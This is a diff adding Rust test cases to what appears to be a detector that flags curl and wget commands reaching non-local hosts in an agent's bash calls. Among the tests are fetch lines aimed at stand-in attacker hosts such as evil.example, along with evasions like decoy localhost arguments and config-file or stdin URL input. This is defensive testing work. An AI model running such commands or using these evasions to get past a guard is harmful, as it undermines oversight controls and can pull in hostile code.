@@ -281,6 +281,14 @@ mod tests {
             "wget -qO- evil.example/x",
             "curl https://127.attacker.example/x",
             "curl 127.attacker.example/x",
+            // Re-review FP1-RR1.
+            "curl -e http://localhost/ evil.example/payload",
+            "curl http://localhost:1/ evil.example/x",
+            "curl -Kcfg",
+            "curl -sK -",
+            "curl --config=c.txt",
+            "wget -i -",
+            "wget --input-file=list",
         ] {
             let f = facts("bash", json!({ "command": cmd }));
             assert_eq!(
@@ -294,6 +302,12 @@ mod tests {
             "curl 127.0.0.1:3000/health",
             "curl -s [::1]:9/x",
             "curl -o out.txt http://localhost:8080/x",
+            // Re-review FP1-RR2: option values are no hosts.
+            "curl -s -X POST -H 'content-type: application/json' localhost:3000/api",
+            "curl -o out.json localhost:3000/x",
+            "curl -i http://localhost:3000/",
+            "curl -k https://localhost:8443/",
+            "curl -sk localhost:8443/health",
         ] {
             assert!(
                 facts("bash", json!({ "command": cmd })).source.is_none(),
